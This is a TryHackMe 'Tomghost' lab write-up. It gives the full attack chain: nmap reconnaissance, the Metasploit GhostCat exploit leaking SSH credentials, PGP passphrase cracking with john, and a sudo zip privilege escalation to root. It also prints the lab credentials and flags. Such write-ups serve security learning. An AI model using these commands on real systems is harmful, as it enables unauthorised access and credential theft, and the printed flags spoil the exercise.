---
title: "Tomghost Exploitation"
date: 2024-10-09T17:33:00+06:00
draft: false
tags: ["hacking", "infosec", "tryhackme", "labs"]
categories: ["Write-ups"]
---

## Nmap Scan

I started by scanning the target machine using Nmap to identify open ports and services.

```
nmap -sC -sV -A 10.10.99.183
```

### Nmap Results

```
PORT     STATE SERVICE    VERSION
22/tcp   open  ssh        OpenSSH 7.2p2 Ubuntu 4ubuntu2.8 (Ubuntu Linux; protocol 2.0)
53/tcp   open  tcpwrapped
8009/tcp open  ajp13      Apache Jserv (Protocol v1.3)
8080/tcp open  http       Apache Tomcat 9.0.30
```

### Potential Vulnerabilities

- **22/SSH** - OpenSSH 7.2p2 is potentially vulnerable to username enumeration.
- **8080/HTTP** - Apache Tomcat 9.0.30 is vulnerable to GhostCat (CVE-2020-1938).

## Exploiting GhostCat

Using Metasploit, I searched for the GhostCat vulnerability module:

```
msf6 > search ghostcat
```

I selected the module and set the target host:

```
msf6 > use auxiliary/admin/http/tomcat_ghostcat
msf6 auxiliary(admin/http/tomcat_ghostcat) > set rhosts 10.10.99.183
msf6 auxiliary(admin/http/tomcat_ghostcat) > exploit
```

This revealed sensitive file contents:

```
<description>
     Welcome to GhostCat
        skyfuck:8730281lkjlkjdqlksalks
</description>
```

## SSH Access

I used the extracted credentials to log in via SSH:

```
ssh skyfuck@10.10.99.183
Password: 8730281lkjlkjdqlksalks
```

After gaining access, I checked the home directory and found some files:

```
skyfuck@ubuntu:~$ ls
credential.pgp  tryhackme.asc
```

Checking user privileges:

```
skyfuck@ubuntu:~$ sudo -l
Sorry, user skyfuck may not run sudo on ubuntu.
```

I explored another user’s home directory:

```
skyfuck@ubuntu:/home/merlin$ cat user.txt
THM{GhostCat_1s_so_cr4sy}
```

## Decrypting credential.pgp

I imported the GPG key:

```
gpg --import tryhackme.asc
```

Then I attempted to decrypt the credential file:

```
gpg --decrypt credential.pgp
```

Since I didn't have the passphrase, I transferred the file to my machine using a Python3 HTTP server, extracted the hash, and cracked it using `john`:

```
python3 -m http.server 8080  # On target machine
wget http://10.10.99.183:8080/tryhackme.asc  # On my machine
gpg2john tryhackme.asc > hashfile
john hashfile --wordlist=/usr/share/wordlists/rockyou.txt
```

This revealed the passphrase: `alexandru`. Using this, I decrypted the `credential.pgp` file and obtained the credentials for another user, `merlin`.

```
skyfuck@ubuntu:~$ su merlin
Password: 
merlin@ubuntu:/home/skyfuck$ cd ~
merlin@ubuntu:~$ ls
user.txt
```

## Privilege Escalation to Root

Checking `sudo -l`, I found that `merlin` could run `zip` as root without a password:

```
merlin@ubuntu:~$ sudo -l
Matching Defaults entries for merlin on ubuntu:
    env_reset, mail_badpass, secure_path=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/snap/bin

User merlin may run the following commands on ubuntu:
    (root : root) NOPASSWD: /usr/bin/zip
```

Using GTFOBins, I found a privilege escalation method with `zip`:

![Screensot of a gtfobins](https://miro.medium.com/v2/resize:fit:828/format:webp/1*-BFTfrvnc-5aKItIQyMxdQ.png)

```
merlin@ubuntu:~$ TF=$(mktemp -u)
merlin@ubuntu:~$ sudo zip $TF /etc/hosts -T -TT 'sh #'
  adding: etc/hosts (deflated 31%)
# cd /root
# ls
root.txt  ufw
# cat root.txt
THM{Z1P_1S_FAKE}
```

By exploiting the allowed `zip` command, I gained root access and retrieved the final flag. This completed the exploitation of the machine. 

---

